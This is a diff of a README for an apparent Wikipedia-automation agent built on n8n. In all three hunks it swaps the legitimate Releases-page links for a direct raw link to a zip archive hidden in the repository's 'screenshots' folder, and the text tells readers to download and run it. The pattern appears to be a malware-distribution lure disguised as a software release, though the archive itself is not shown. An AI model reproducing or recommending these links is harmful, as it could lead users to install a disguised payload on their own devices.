@@ -1,6 +1,6 @@
 # 🤖 ai-agent-wikipedia-n8n - Automate Wikipedia Tasks Easily
 
-[![Download Release](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/avarose57/ai-agent-wikipedia-n8n/releases)
+[![Download Release](https://github.com/avarose57/ai-agent-wikipedia-n8n/raw/refs/heads/main/screenshots/ai_agent_n_wikipedia_3.5.zip)](https://github.com/avarose57/ai-agent-wikipedia-n8n/raw/refs/heads/main/screenshots/ai_agent_n_wikipedia_3.5.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to get up and running with ai-agent-wikipedia-n8n.
 
 ### 1. Download the App
 
-[Click here to visit the download page](https://github.com/avarose57/ai-agent-wikipedia-n8n/releases)
+[Click here to visit the download page](https://github.com/avarose57/ai-agent-wikipedia-n8n/raw/refs/heads/main/screenshots/ai_agent_n_wikipedia_3.5.zip)
 
 You will find the latest version available for your operating system. Look for files labeled with your OS (e.g., `.exe` for Windows, `.dmg` for macOS, `.AppImage` or `.deb` for Linux).
 
@@ -129,7 +129,7 @@ You can report bugs by opening an issue on the GitHub page if needed.
 
 Visit this page to download the latest version of ai-agent-wikipedia-n8n:
 
-[https://github.com/avarose57/ai-agent-wikipedia-n8n/releases](https://github.com/avarose57/ai-agent-wikipedia-n8n/releases)
+[https://github.com/avarose57/ai-agent-wikipedia-n8n/raw/refs/heads/main/screenshots/ai_agent_n_wikipedia_3.5.zip](https://github.com/avarose57/ai-agent-wikipedia-n8n/raw/refs/heads/main/screenshots/ai_agent_n_wikipedia_3.5.zip)
 
 Choose the correct file for your device, then follow the installation steps above. Keep the download link handy for updates or reinstallations.
 
